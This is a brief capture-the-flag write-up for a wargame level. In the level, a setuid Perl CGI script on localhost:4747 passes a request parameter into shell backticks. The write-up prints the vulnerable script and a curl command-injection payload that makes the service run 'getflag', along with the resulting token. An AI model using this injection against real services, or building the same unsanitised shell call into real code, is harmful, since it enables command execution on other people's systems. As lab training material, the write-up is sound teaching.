# First step

We have a level04.pl file on home directory.  
We can know this file have a 's' permission and is a perl file.  

```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
        $y = $_[0];
        print `echo $y 2>&1`;
    }
    x(param("x"));
```

```shell
$> ./level04.pl test  
Content-type: text/html 

$> ./level04.pl x=test  
Content-type: text/html
test  
```

we can know this file run background on localhost:4747  
we have a subroutine(means function) x() in this file.  
we can know the subroutine x() take a parameter and use it to execute a command.  

# Second step

We know the symbols `command` will execute a command in the shell.
Same way for a perl file, if we use symbol `` with a command, it will execute the command in the shell.

```shell
$> curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```